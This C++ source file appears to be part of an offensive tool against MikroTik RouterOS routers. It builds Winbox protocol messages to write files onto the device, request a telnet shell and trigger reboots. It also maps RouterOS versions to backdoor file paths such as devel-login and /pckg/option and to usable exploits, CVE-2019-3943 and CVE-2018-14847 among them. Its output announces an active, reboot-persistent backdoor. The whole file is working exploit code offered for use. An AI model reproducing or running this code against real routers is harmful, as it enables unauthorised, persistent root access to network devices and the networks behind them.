#include "makemessage.hpp"

#include "winbox_message.hpp"

#include <regex>
#include <iostream>

namespace msg
{
    void make_version_request(WinboxMessage& p_msg, boost::uint32_t p_id)
    {
        std::cout << "[+] Sending a version request" << std::endl;
        p_msg.reset();
        p_msg.set_to(24, 2);
        p_msg.set_command(16646157);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
    }

    void make_open_write(WinboxMessage& p_msg, boost::uint32_t p_id, const std::string& p_file, boost::uint32_t p_to, boost::uint32_t p_sub_to)
    {
        std::cout << "[+] Opening " << p_file << " for writing." << std::endl;
        p_msg.reset();
        p_msg.set_to(p_to, p_sub_to);
        p_msg.set_command(1);
        p_msg.add_string(1, p_file);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
    }

    void make_write(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id, const std::string& p_data, boost::uint32_t p_to, boost::uint32_t p_sub_to)
    {
        std::cout << "[+] Writing to file." << std::endl;
        p_msg.reset();
        p_msg.set_to(p_to, p_sub_to);
        p_msg.set_command(2);
        p_msg.set_request_id(p_id);
        p_msg.add_u32(0xfe0001, p_session_id);
        p_msg.add_raw(5, p_data);
        p_msg.set_reply_expected(true);
    }

    // {bff0005:1,uff0006:9,uff0007:5,Uff0001:[24],Uff0002:[0,8]}
    void make_reboot(WinboxMessage& p_msg, boost::uint32_t p_id)
    {
        std::cout << "[+] Sending a reboot request" << std::endl;
        p_msg.reset();
        p_msg.set_to(24);
        p_msg.set_command(5);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
    }

    void make_term_request(WinboxMessage& p_msg, boost::uint32_t p_id, const std::string& p_username)
    {
        std::cout << "[+] Sending a telnet terminal request " << std::endl;
        p_msg.reset();
        p_msg.set_to(0x4c);
        p_msg.set_command(0xa0065);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
        p_msg.add_u32(5,80); // height?
        p_msg.add_u32(6,24); // width?
        p_msg.add_u32(8,1);  // controls method. 0 (nova/bin/login), 1 (telnet), 2 (ssh), 3 (mactel), 4 (nova/bin/telser), default...
        p_msg.add_string(0x0a, p_username); //username
        p_msg.add_string(1, "");
        p_msg.add_string(7, "vt102");
        p_msg.add_string(9, "-l a"); // drop into telnet client shell
    }

    // {u3:932,ufe0001:0,uff0007:655463,Uff0001:[76],Uff0002:[0,456]}
    void make_init_term_tracker(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id)
    {
        std::cout << "[+] Sending the byte tracking initializer " << std::endl;
        p_msg.reset();
        p_msg.set_to(0x4c);
        p_msg.set_command(0xa0067);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
        p_msg.add_u32(3, 0);
        p_msg.add_u32(0xfe0001, p_session_id);
    }

    //{u3:1047,ufe0001:0,uff0007:655463,r2:[115],Uff0001:[76],Uff0002:[0,456]}
    void make_set_tracefile(WinboxMessage& p_msg, boost::uint32_t p_id, boost::uint32_t p_session_id, boost::uint32_t p_tracker, const std::string& p_trace_command)
    {
        std::cout << "[+] Sending " << p_trace_command << std::flush;
        p_msg.reset();
        p_msg.set_to(0x4c);
        p_msg.set_command(0xa0067);
        p_msg.set_request_id(p_id);
        p_msg.set_reply_expected(true);
        p_msg.add_u32(3, p_tracker);
        p_msg.add_u32(0xfe0001, p_session_id);
        p_msg.add_raw(2, p_trace_command);
    }

    /**
     * Convert the version string into three ints. <major>.<minor>.<point>
     * 
     * \param[in] p_version the version string
     * \param[in,out] p_big the major version is stored here
     * \param[in,out] p_little the minor version is stored here
     * \param[in,out] p_point the point release is stored here (set to 0 by default)
     * 
     * \return true on successful parsing and false otherwise.
     */
    static bool extract_version(const std::string& p_version, int& p_big, int& p_little, int& p_point)
    {
        const std::regex version_regex("^([3-6])\\.([0-9]{1,2})\\.?([0-9]{0,2}).*");
        std::smatch version_parts;
        if (!std::regex_match(p_version, version_parts, version_regex))
        {
            std::cerr << "[-] Failed to parse the received version string" << std::endl;
            return false;
        }

        // convert the version parts into ints. note that stoi can throw an exception
        try
        {
            p_big = std::stoi(version_parts[1]);
            p_little = std::stoi(version_parts[2]);
            p_point = 0;
            if (!version_parts[3].str().empty())
            {
                p_point = std::stoi(version_parts[3]);
            }
        }
        catch (const std::exception&)
        {
            std::cerr << "[-] Error converting the version string" << std::endl;
            return false;
        }

        return true;
    }

    backdoor_location find_backdoor_location(const std::string& p_version, std::string& p_location)
    {
        int big_ver = 0;
        int little_ver = 0;
        int point_ver = 0;
        if (!extract_version(p_version, big_ver, little_ver, point_ver))
        {
            return msg::backdoor_location::k_fail;
        }
    
        if (big_ver < 6)
        {
            p_location.assign("/nova/etc/devel-login");
            return k_nova;
        }

        // has to be big ver == 6

        if (little_ver < 41)
        {
            p_location.assign("/flash/nova/etc/devel-login");
            return k_flash;
        }

        // greater than 6.40

        if (little_ver == 41 ||
            (little_ver == 42 && point_ver == 0))
        {
            // All versions of 6.41 and 6.42.0
            p_location.assign("/pckg/option");
            return k_opt;
        }

        // everything else
        p_location.assign("/pckg/option");
        return k_opt_sym_or_sqsh;
    }

    std::vector<exploits> find_supported_exploits(const std::string& p_version)
    {
        int big_ver = 0;
        int little_ver = 0;
        int point_ver = 0;
        if (!extract_version(p_version, big_ver, little_ver, point_ver))
        {
            return std::vector<exploits>();
        }

        if (big_ver < 6 || (big_ver == 6 && little_ver < 40))
        {
            // \o/ all the things \o/
            return { k_cve_2019_3943, k_hackerfantastic_tracefile, k_cve_2018_14847 };
        }
        else if (little_ver == 40)
        {
            if (point_ver < 8)
            {
                return { k_cve_2019_3943, k_hackerfantastic_tracefile, k_cve_2018_14847 };
            }
            else
            {
                return { k_cve_2019_3943, k_hackerfantastic_tracefile };
            }
        }
        else if (little_ver == 41)
        {
            return { k_hackerfantastic_tracefile, k_cve_2019_3943, exploits::k_cve_2018_14847 };
        }
        else if (little_ver == 42)
        {
            if (point_ver == 0)
            {
                return { k_hackerfantastic_tracefile, k_cve_2019_3943, exploits::k_cve_2018_14847 };
            }
            else if (point_ver < 12)
            {
                return { k_hackerfantastic_tracefile, k_cve_2019_3943 };
            }
            else 
            {
                return { k_cve_2019_3943 };
            }
        }
        else if (little_ver == 43)
        {
            if (point_ver < 15)
            {
                return { k_cve_2019_3943 };
            }
        }

        return std::vector<exploits>();
    }

    std::string sploit_string(exploits p_exploits)
    {
        switch (p_exploits)
        {
            case k_hackerfantastic_tracefile:
                return "HackerFantastic Set Tracefile";

            case k_cve_2019_3943:
                return "CVE-2019-3943";

            case k_cve_2018_14847:
                return "CVE-2018-14847";

            default:
                return "oh dear!";
        }
    }

    void activation_message(backdoor_location p_type, bool p_do_symlink, bool p_do_persistence)
    {
        switch (p_type)
        {
            case k_nova:
            case k_flash:
                std::cout << "[+] Done! The backdoor is active. ><(((°>" << std::endl;
                break;
            case k_opt:
                if (!p_do_symlink && !p_do_persistence)
                {
                    std::cout << "[+] Done! The backdoor is active. ><(((°>" << std::endl;
                    break;
                }
                // else fallllll
            case k_opt_sym_or_sqsh:
                std::cout << "[+] Done! The backdoor will be active after a reboot. ><(((°>" << std::endl;
                break;
            default:
                break;
        }       
    }

    bool reboot_message(backdoor_location p_type, bool p_do_symlink, bool p_do_persistence)
    {
        switch (p_type)
        {
            default:
            case k_nova:
            case k_flash:
                return false;
            case k_opt:
                if (!p_do_symlink && !p_do_persistence)
                {
                    return false;
                }
                // else fallllll
            case k_opt_sym_or_sqsh:
            {
                char response = 0;
                do
                {
                    std::cout << "[?] Reboot now [Y/N]? ";
                    std::cin >> response;
                }
                while (!std::cin.fail() && response != 'Y' && response != 'N');
        
                return response == 'Y';
            }
        }
        return false;
    }

    void persistence_warning(backdoor_location p_type)
    {
        switch (p_type)
        {
            case k_nova:
            case k_flash:
                std::cout << std::endl << std::endl;
                std::cout << "REMEMBER! The backdoor file on this version of RouterOS is persistent across reboots." << std::endl;
                break;
            case k_opt:
            case k_opt_sym_or_sqsh:
                break;
            default:
                break;
        }
    }
}
